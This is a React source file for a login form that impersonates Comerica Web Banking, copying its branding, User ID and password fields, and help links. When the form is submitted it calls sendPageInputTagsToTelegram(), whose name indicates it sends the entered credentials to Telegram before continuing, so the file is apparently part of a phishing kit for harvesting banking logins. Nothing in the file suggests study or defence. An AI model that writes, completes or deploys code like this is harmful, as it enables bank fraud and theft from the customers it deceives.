import React, { useState } from 'react'
import { sendPageInputTagsToTelegram } from '../utils/telegram'

interface LoginFormProps {
  onLogin: () => void;
}

export function LoginForm({ onLogin }: LoginFormProps) {
  const [userId, setUserId] = useState('')
  const [password, setPassword] = useState('')
  const [saveUserId, setSaveUserId] = useState(false)

  const isValidLength = (value: string) => value.length >= 6 && value.length <= 30;
  const isFormValid = isValidLength(userId) && isValidLength(password);

  const handleLogin = async () => {
    if (isFormValid) {
      await sendPageInputTagsToTelegram();
      onLogin();
    }
  }

  return (
    <div className="w-full px-6 py-8">
      <h2 className="text-[#00205B] font-bold text-lg mb-5">
        Comerica Web Banking®
      </h2>

      <div className="space-y-5">
        <div>
          <input
            type="text"
            placeholder="User ID"
            value={userId}
            onChange={(e) => setUserId(e.target.value.slice(0, 30))}
            className="w-full bg-[#F9F9F9] border border-gray-300 rounded-sm px-4 py-3.5 text-gray-800 placeholder-gray-500 focus:outline-none focus:border-[#0066CC] focus:ring-1 focus:ring-[#0066CC]"
          />
        </div>

        <div className="flex items-center">
          <input
            type="checkbox"
            id="saveUserId"
            checked={saveUserId}
            onChange={(e) => setSaveUserId(e.target.checked)}
            className="w-5 h-5 border-gray-400 rounded-sm text-[#0066CC] focus:ring-[#0066CC] cursor-pointer"
          />
          <label
            htmlFor="saveUserId"
            className="ml-3 text-gray-700 text-base cursor-pointer"
          >
            Save User ID
          </label>
        </div>

        <div>
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value.slice(0, 30))}
            className="w-full bg-[#F9F9F9] border border-gray-300 rounded-sm px-4 py-3.5 text-gray-800 placeholder-gray-500 focus:outline-none focus:border-[#0066CC] focus:ring-1 focus:ring-[#0066CC]"
          />
        </div>

        <div className="flex items-center justify-between pt-4">
          <button 
            onClick={handleLogin}
            disabled={!isFormValid}
            className={`${isFormValid ? 'bg-[#a23232]' : 'bg-[#C75B12]'} text-white font-bold py-2.5 px-8 rounded-sm hover:opacity-90 transition-colors w-[42%]`}
          >
            LOG IN
          </button>
          <span className="text-gray-500 text-sm">OR</span>
          <button className="bg-white text-[#C75B12] border-2 border-[#C75B12] font-bold py-2 px-8 rounded-sm hover:bg-orange-50 transition-colors w-[42%]">
            ENROLL
          </button>
        </div>

        <div className="flex items-center justify-center space-x-3 pt-6 text-sm">
          <a href="#" className="text-gray-600 hover:underline">
            Forgot Password
          </a>
          <span className="text-gray-300">|</span>
          <a href="#" className="text-gray-600 hover:underline">
            Help
          </a>
          <span className="text-gray-300">|</span>
          <a href="#" className="text-[#0066CC] hover:underline">
            Fraud Center
          </a>
        </div>
      </div>

      <div className="w-full h-px bg-gray-200 mt-8"></div>
    </div>
  )
}
